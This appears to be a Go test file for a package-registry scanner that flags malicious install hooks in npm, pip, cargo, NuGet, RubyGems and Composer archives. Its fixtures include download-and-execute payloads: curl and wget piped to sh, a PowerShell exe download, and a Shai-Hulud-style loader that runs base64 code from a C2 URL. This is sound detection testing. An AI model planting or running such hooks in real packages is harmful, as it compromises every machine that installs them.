package intelligence

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"context"
	"strings"
	"testing"

	"github.com/chain305/chainsaw-core/installscripts"
)

// buildZip produces a zip from a set of (name, body) pairs — matches
// the shape of a NuGet .nupkg.
func buildZip(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, body := range files {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatalf("zip Create: %v", err)
		}
		if _, err := w.Write([]byte(body)); err != nil {
			t.Fatalf("zip Write: %v", err)
		}
	}
	if err := zw.Close(); err != nil {
		t.Fatalf("zip Close: %v", err)
	}
	return buf.Bytes()
}

func containsSeen(seen []string, needleSubstr string) bool {
	for _, s := range seen {
		if strings.Contains(s, needleSubstr) {
			return true
		}
	}
	return false
}

// buildTGZ produces a gzipped tar from a set of (name, body) pairs. This
// matches the shape of an npm / pip sdist / cargo .crate upload.
func buildTGZ(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	tw := tar.NewWriter(gw)
	for name, body := range files {
		hdr := &tar.Header{
			Name: name,
			Mode: 0o644,
			Size: int64(len(body)),
		}
		if err := tw.WriteHeader(hdr); err != nil {
			t.Fatalf("WriteHeader: %v", err)
		}
		if _, err := tw.Write([]byte(body)); err != nil {
			t.Fatalf("Write: %v", err)
		}
	}
	if err := tw.Close(); err != nil {
		t.Fatalf("tar Close: %v", err)
	}
	if err := gw.Close(); err != nil {
		t.Fatalf("gzip Close: %v", err)
	}
	return buf.Bytes()
}

func TestInstallScriptsProvider_DetectsRemoteFetch(t *testing.T) {
	p := newInstallScriptsProvider()
	if !p.Supports("npm") {
		t.Fatalf("npm should be supported")
	}
	if !p.NeedsArtifact() {
		t.Fatalf("provider should report NeedsArtifact=true")
	}

	// npm convention: tarball entries live under a "package/" prefix.
	body := `{"name":"evil","version":"1.0.0","scripts":{"postinstall":"curl https://evil.example.com/x | sh"}}`
	payload := buildTGZ(t, map[string]string{
		"package/package.json": body,
	})

	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "npm", Package: "evil", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan to be populated")
	}
	if !partial.Scan.Performed {
		t.Fatalf("Performed should be true")
	}
	if !partial.Scan.HasInstallScript {
		t.Fatalf("HasInstallScript should be true")
	}
	if !partial.Scan.InstallScriptFetches {
		t.Fatalf("InstallScriptFetches should be true for curl | sh")
	}
	if partial.Scan.InstallScriptKind != "fetches_remote" {
		t.Fatalf("InstallScriptKind: got %q, want fetches_remote", partial.Scan.InstallScriptKind)
	}
}

func TestInstallScriptsProvider_CleanPackageNoScripts(t *testing.T) {
	p := newInstallScriptsProvider()
	payload := buildTGZ(t, map[string]string{
		"package/package.json": `{"name":"clean","version":"1.0.0"}`,
	})

	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "npm", Package: "clean", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan populated even for clean package")
	}
	if partial.Scan.HasInstallScript {
		t.Fatalf("clean package should not show an install script")
	}
	if partial.Scan.InstallScriptKind != "none" {
		t.Fatalf("Kind: got %q, want none", partial.Scan.InstallScriptKind)
	}
}

func TestInstallScriptsProvider_NilArtifactShortCircuits(t *testing.T) {
	p := newInstallScriptsProvider()
	partial, err := p.Run(context.Background(), Request{
		Key: Key{Ecosystem: "npm", Package: "x", Version: "1.0.0"},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan != nil {
		t.Fatalf("expected empty PartialReport on nil artifact, got %+v", partial.Scan)
	}
}

// ---------------------------------------------------------------------------
// R2 false-positive regression guards (flywheel detection-lead eval).
//
// The detection-lead eval surfaced requests@2.32.3 mis-gating: its setup.py
// ships the classic setuptools publish shortcut —
//
//	if sys.argv[-1] == "publish":
//	    os.system("python setup.py sdist bdist_wheel")
//	    os.system("twine upload dist/*")
//
// — which runs on `setup.py publish`, NOT on install. The installscripts
// parser's stripPipReleaseHelpers drops lines where an exec primitive
// co-occurs with a release verb (upload/publish/sdist/twine), so the
// publish helper no longer escalates to fetches_remote. These provider-level
// guards lock that behaviour end-to-end AND prove a genuine install-time
// fetch+exec still fires.
// ---------------------------------------------------------------------------

// requestsStyleSetupPy mirrors the requests@2.32.3 publish-helper shape.
const requestsStyleSetupPy = `import os
import sys
from setuptools import setup

# 'setup.py publish' shortcut.
if sys.argv[-1] == "publish":
    os.system("python setup.py sdist bdist_wheel")
    os.system("twine upload dist/*")
    sys.exit()

setup(
    name="requests",
    version="2.32.3",
    url="https://requests.readthedocs.io",
    packages=["requests"],
)
`

func TestInstallScriptsProvider_PipPublishHelperNotRemoteFetch(t *testing.T) {
	p := newInstallScriptsProvider()
	payload := buildTGZ(t, map[string]string{
		"requests-2.32.3/setup.py":       requestsStyleSetupPy,
		"requests-2.32.3/pyproject.toml": "",
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "pypi", Package: "requests", Version: "2.32.3"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan populated")
	}
	// The publish helper is release-time, not install-time: it must NOT be
	// classified as a remote-fetch install script (the FP the eval caught).
	if partial.Scan.InstallScriptFetches {
		t.Fatalf("requests-style publish helper must NOT be flagged InstallScriptFetches, got %+v", partial.Scan)
	}
	if partial.Scan.InstallScriptKind == "fetches_remote" {
		t.Fatalf("InstallScriptKind must not be fetches_remote for a publish helper, got %q", partial.Scan.InstallScriptKind)
	}
}

// TestInstallScriptsProvider_PipGenuineInstallFetchStillFires: the security
// guard. A setup.py that fetches+executes remote code at install time (no
// release-verb cover) MUST still escalate to fetches_remote — proving the
// publish-helper stripping did not blind the real PhantomRaven-style exfil.
func TestInstallScriptsProvider_PipGenuineInstallFetchStillFires(t *testing.T) {
	p := newInstallScriptsProvider()
	// os.system around a curl|sh at module scope — runs on `pip install`.
	// No upload/publish/sdist/twine token, so stripPipReleaseHelpers keeps it.
	evilSetupPy := `import os
from setuptools import setup

os.system("curl https://evil.example.com/x.sh | sh")

setup(name="evil", version="1.0.0", packages=["evil"])
`
	payload := buildTGZ(t, map[string]string{
		"evil-1.0.0/setup.py":       evilSetupPy,
		"evil-1.0.0/pyproject.toml": "",
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "pypi", Package: "evil", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil || !partial.Scan.InstallScriptFetches {
		t.Fatalf("genuine install-time fetch+exec MUST fire InstallScriptFetches, got %+v", partial.Scan)
	}
	if partial.Scan.InstallScriptKind != "fetches_remote" {
		t.Fatalf("InstallScriptKind: got %q, want fetches_remote", partial.Scan.InstallScriptKind)
	}
}

func TestInstallScriptsProvider_UnsupportedEcosystem(t *testing.T) {
	p := newInstallScriptsProvider()
	if p.Supports("docker") {
		t.Fatalf("docker should not be supported — no install-script parser")
	}
	if p.Supports("") {
		t.Fatalf("empty ecosystem should not be supported")
	}
}

func TestInstallScriptsProvider_YarnAliasedToNPM(t *testing.T) {
	p := newInstallScriptsProvider()
	if !p.Supports("yarn") {
		t.Fatalf("yarn should be supported (aliased to npm)")
	}
	payload := buildTGZ(t, map[string]string{
		"package/package.json": `{"name":"evil","version":"1.0.0","scripts":{"preinstall":"wget -O- https://x | sh"}}`,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "yarn", Package: "evil", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil || !partial.Scan.InstallScriptFetches {
		t.Fatalf("expected yarn alias to detect remote fetch, got %+v", partial.Scan)
	}
}

func TestInstallScriptsProvider_NuGetDetectsHookScript(t *testing.T) {
	p := newInstallScriptsProvider()
	if !p.Supports("nuget") {
		t.Fatalf("nuget should be supported")
	}
	payload := buildZip(t, map[string]string{
		"package.nuspec":            "<package/>",
		"tools/install.ps1":         `Invoke-WebRequest "https://evil.example.com/x.exe" -OutFile a.exe`,
		"tools/net45/uninstall.ps1": `Write-Host clean`,
		"tools/init.ps1":            `Write-Host hello`,
		"lib/net45/Some.dll":        "MZ",
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "nuget", Package: "evil", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan populated")
	}
	if !partial.Scan.HasInstallScript {
		t.Fatalf("HasInstallScript should be true (PowerShell hooks present)")
	}
	if !partial.Scan.InstallScriptFetches {
		t.Fatalf("InstallScriptFetches should be true (Invoke-WebRequest)")
	}
	if partial.Scan.InstallScriptKind != "fetches_remote" {
		t.Fatalf("Kind: got %q want fetches_remote", partial.Scan.InstallScriptKind)
	}
	if !containsSeen(partial.Scan.ManifestFilesSeen, "install.ps1") {
		t.Fatalf("ManifestFilesSeen should reference install.ps1: %v", partial.Scan.ManifestFilesSeen)
	}
}

func TestInstallScriptsProvider_NuGetCleanPackageNoHooks(t *testing.T) {
	p := newInstallScriptsProvider()
	payload := buildZip(t, map[string]string{
		"package.nuspec":     "<package/>",
		"lib/net45/Some.dll": "MZ",
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "nuget", Package: "clean", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan != nil {
		t.Fatalf("expected empty PartialReport when no NuGet hooks present, got %+v", partial.Scan)
	}
}

func TestInstallScriptsProvider_RubyGemsExtensionsField(t *testing.T) {
	p := newInstallScriptsProvider()
	gemspec := `Gem::Specification.new do |s|
  s.name = "evil"
  s.version = "1.0.0"
  s.extensions = ["ext/evil/extconf.rb"]
end`
	payload := buildTGZ(t, map[string]string{
		"evil.gemspec": gemspec,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "rubygems", Package: "evil", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan populated")
	}
	if !partial.Scan.HasInstallScript {
		t.Fatalf("HasInstallScript should be true for s.extensions")
	}
	if !containsSeen(partial.Scan.ManifestFilesSeen, "extconf.rb") {
		t.Fatalf("expected extconf.rb in ManifestFilesSeen: %v", partial.Scan.ManifestFilesSeen)
	}
}

func TestInstallScriptsProvider_ComposerBinField(t *testing.T) {
	p := newInstallScriptsProvider()
	composer := `{"name":"evil/p","bin":["bin/evil","bin/evil2"]}`
	payload := buildTGZ(t, map[string]string{
		"composer.json": composer,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "composer", Package: "evil/p", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan populated")
	}
	if !partial.Scan.HasInstallScript {
		t.Fatalf("HasInstallScript should be true for composer bin field")
	}
	if !containsSeen(partial.Scan.ManifestFilesSeen, "bin:bin/evil") {
		t.Fatalf("expected bin entry surfaced: %v", partial.Scan.ManifestFilesSeen)
	}
}

func TestInstallScriptsProvider_ComposerBinStringForm(t *testing.T) {
	p := newInstallScriptsProvider()
	composer := `{"name":"evil/p","bin":"bin/evil"}`
	payload := buildTGZ(t, map[string]string{
		"composer.json": composer,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "composer", Package: "evil/p", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil || !partial.Scan.HasInstallScript {
		t.Fatalf("composer bin (string) should mark HasInstallScript: %+v", partial.Scan)
	}
}

func TestInstallScriptsProvider_PythonSetupCfgFallback(t *testing.T) {
	p := newInstallScriptsProvider()
	setupPy := "from setuptools import setup\nsetup()\n"
	setupCfg := "[options]\ninstall_requires =\n    requests\n\n[options.entry_points]\nconsole_scripts =\n    evil = evil.main:run\n"
	payload := buildTGZ(t, map[string]string{
		"setup.py":  setupPy,
		"setup.cfg": setupCfg,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "pip", Package: "evil", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan populated")
	}
	if !partial.Scan.HasInstallScript {
		t.Fatalf("HasInstallScript should be true via setup.cfg entry_points")
	}
	if !containsSeen(partial.Scan.ManifestFilesSeen, "setup.cfg") {
		t.Fatalf("expected setup.cfg in ManifestFilesSeen: %v", partial.Scan.ManifestFilesSeen)
	}
}

func TestInstallScriptsProvider_CargoBuildRsScansShellExec(t *testing.T) {
	p := newInstallScriptsProvider()
	cargoToml := `[package]
name = "evil"
version = "1.0.0"
build = "build.rs"
`
	buildRs := `use std::process::Command;
fn main() {
    let _ = Command::new("/bin/sh").arg("-c").arg("curl https://evil.example.com | sh").status();
}
`
	payload := buildTGZ(t, map[string]string{
		"Cargo.toml": cargoToml,
		"build.rs":   buildRs,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "cargo", Package: "evil", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan populated")
	}
	if !partial.Scan.HasInstallScript {
		t.Fatalf("HasInstallScript should be true (Cargo build.rs present)")
	}
	if !partial.Scan.InstallScriptFetches {
		t.Fatalf("InstallScriptFetches should be true (build.rs runs /bin/sh + curl)")
	}
	if !containsSeen(partial.Scan.ManifestFilesSeen, "build.rs:") {
		t.Fatalf("expected build.rs sub-finding in ManifestFilesSeen: %v", partial.Scan.ManifestFilesSeen)
	}
}

// ---------------------------------------------------------------------------
// Bundled-install-script body scan (Shai-Hulud / "bun" loader wave).
//
// The weak-install-only miss class: a preinstall hook invokes a LOCAL script
// bundled in the tarball (`node setup_bun.js`). The manifest string only
// shows that a script exists and references a local file — the payload lives
// in that file's BODY. These tests prove we now resolve the referenced file
// from the artifact and run the fetch/exec heuristics on its body, while
// legit local build scripts (node-gyp wrappers) stay clean.
// ---------------------------------------------------------------------------

// shaiHuludSetupBun mirrors the bundled loader body: https.get C2 +
// child_process exec of the response. Minified blobs are larger but the
// signal shape is identical.
const shaiHuludSetupBun = `
const https = require('https');
const cp = require('child_process');
https.get('https://npmjs.help/c2/payload', (res) => {
  let buf = '';
  res.on('data', (c) => { buf += c; });
  res.on('end', () => { cp.exec(Buffer.from(buf, 'base64').toString()); });
});
`

func TestInstallScriptsProvider_BundledLoaderFetchExec_Fires(t *testing.T) {
	p := newInstallScriptsProvider()
	pkgJSON := `{"name":"is-buffer-validator","version":"1.0.0","scripts":{"preinstall":"node setup_bun.js"}}`
	payload := buildTGZ(t, map[string]string{
		"package/package.json": pkgJSON,
		"package/setup_bun.js": shaiHuludSetupBun,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "npm", Package: "is-buffer-validator", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil || !partial.Scan.HasInstallScript {
		t.Fatalf("expected HasInstallScript true, got %+v", partial.Scan)
	}
	if !partial.Scan.InstallScriptFetches {
		t.Fatalf("bundled loader body has https.get+child_process.exec — must escalate to fetches; got %+v", partial.Scan)
	}
	if partial.Scan.InstallScriptKind != "fetches_remote" {
		t.Fatalf("InstallScriptKind: got %q, want fetches_remote", partial.Scan.InstallScriptKind)
	}
	if !containsSeen(partial.Scan.ManifestFilesSeen, "setup_bun.js") {
		t.Fatalf("expected referenced-script sub-finding for setup_bun.js: %v", partial.Scan.ManifestFilesSeen)
	}
}

// TestInstallScriptsProvider_DecoyShadowedPayloadFires is the reviewer's HIGH
// shadow-bypass guard: an attacker plants a BENIGN decoy at the package root
// (package/index.js) and buries the real payload one dir down
// (package/lib/index.js), both matching the bare `node index.js` hook. The
// resolver must scan EVERY basename match, not just the shallowest decoy — so
// the buried payload is still caught.
func TestInstallScriptsProvider_DecoyShadowedPayloadFires(t *testing.T) {
	p := newInstallScriptsProvider()
	pkgJSON := `{"name":"shadow-pkg","version":"1.0.0","scripts":{"preinstall":"node index.js"}}`
	payload := buildTGZ(t, map[string]string{
		"package/package.json": pkgJSON,
		"package/index.js":     "module.exports = require('./lib');\nconsole.log('ok');\n", // benign decoy at root
		"package/lib/index.js": shaiHuludSetupBun,                                          // real payload, buried
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "npm", Package: "shadow-pkg", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil || !partial.Scan.InstallScriptFetches {
		t.Fatalf("buried payload behind a root decoy must still escalate (scan ALL basename matches); got %+v", partial.Scan)
	}
}

// Legit native-build wrapper: preinstall invokes a local build.js that only
// shells out to the local compiler toolchain (no remote fetch, no eval). Must
// stay clean — a false block on a real install is the worst outcome.
func TestInstallScriptsProvider_BundledBuildScript_StaysClean(t *testing.T) {
	p := newInstallScriptsProvider()
	pkgJSON := `{"name":"native-thing","version":"2.1.0","scripts":{"preinstall":"node ./scripts/build.js"}}`
	buildJS := `
const { execFileSync } = require('child_process');
// Compile the native addon with the locally-installed toolchain.
execFileSync('node-gyp', ['rebuild'], { stdio: 'inherit' });
console.log('built native addon');
`
	payload := buildTGZ(t, map[string]string{
		"package/package.json":     pkgJSON,
		"package/scripts/build.js": buildJS,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "npm", Package: "native-thing", Version: "2.1.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan populated")
	}
	if partial.Scan.InstallScriptFetches {
		t.Fatalf("benign local-compile build.js must NOT escalate to fetches; got %+v", partial.Scan)
	}
	if partial.Scan.InstallScriptKind == "fetches_remote" {
		t.Fatalf("benign build wrapper Kind must not be fetches_remote, got %q", partial.Scan.InstallScriptKind)
	}
}

func TestInstallScriptsProvider_ReferencedScriptMutatesDependencyWarns(t *testing.T) {
	p := newInstallScriptsProvider()
	pkgJSON := `{"name":"html-to-gutenberg","version":"4.2.10","scripts":{"postinstall":"node ./scripts/patch-fetch-page-assets.mjs"}}`
	patcher := `
import fs from "fs";
import path from "path";

const projectRoot = process.cwd();
const sourcePath = path.join(projectRoot, "vendor", "fetch-page-assets", "index.js");
const targetPath = path.join(projectRoot, "node_modules", "fetch-page-assets", "index.js");

fs.copyFileSync(sourcePath, targetPath);
`
	payload := buildTGZ(t, map[string]string{
		"package/package.json":                        pkgJSON,
		"package/scripts/patch-fetch-page-assets.mjs": patcher,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "npm", Package: "html-to-gutenberg", Version: "4.2.10"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil {
		t.Fatalf("expected Scan populated")
	}
	if partial.Scan.InstallScriptKind != string(installscripts.KindMutatesDependency) {
		t.Fatalf("InstallScriptKind: got %q, want %q", partial.Scan.InstallScriptKind, installscripts.KindMutatesDependency)
	}
	if !partial.Scan.HasInstallScript {
		t.Fatalf("expected HasInstallScript=true, got %+v", partial.Scan)
	}
	if partial.Scan.InstallScriptFetches {
		t.Fatalf("dependency mutation warning must not become fetches_remote/block-grade, got %+v", partial.Scan)
	}
}

// node-gyp rebuild directly in the hook (no local file reference) must remain
// clean — guards against the parser resolving a system bin as a bundled file.
func TestInstallScriptsProvider_NodeGypHook_StaysClean(t *testing.T) {
	p := newInstallScriptsProvider()
	pkgJSON := `{"name":"gyp-pkg","version":"1.0.0","scripts":{"install":"node-gyp rebuild"}}`
	payload := buildTGZ(t, map[string]string{
		"package/package.json": pkgJSON,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "npm", Package: "gyp-pkg", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan.InstallScriptFetches {
		t.Fatalf("node-gyp rebuild must not fetch; got %+v", partial.Scan)
	}
}

// pip: setup.py invokes a bundled local helper that downloads + os.system's
// it. Must escalate.
func TestInstallScriptsProvider_PipBundledHelper_Fires(t *testing.T) {
	p := newInstallScriptsProvider()
	setupPy := `from setuptools import setup
import subprocess
subprocess.call(['python3', '_bootstrap.py'])
setup(name='x', version='1.0.0')
`
	bootstrap := `import urllib.request, os
urllib.request.urlretrieve('http://evil.example/stage2', '/tmp/s2')
os.system('/tmp/s2')
`
	payload := buildTGZ(t, map[string]string{
		"x-1.0.0/setup.py":      setupPy,
		"x-1.0.0/_bootstrap.py": bootstrap,
	})
	partial, err := p.Run(context.Background(), Request{
		Key:      Key{Ecosystem: "pypi", Package: "x", Version: "1.0.0"},
		Artifact: &ArtifactHandle{Bytes: payload},
	}, nil)
	if err != nil {
		t.Fatalf("Run err: %v", err)
	}
	if partial.Scan == nil || !partial.Scan.InstallScriptFetches {
		t.Fatalf("pip bundled helper download+os.system must escalate to fetches; got %+v", partial.Scan)
	}
}
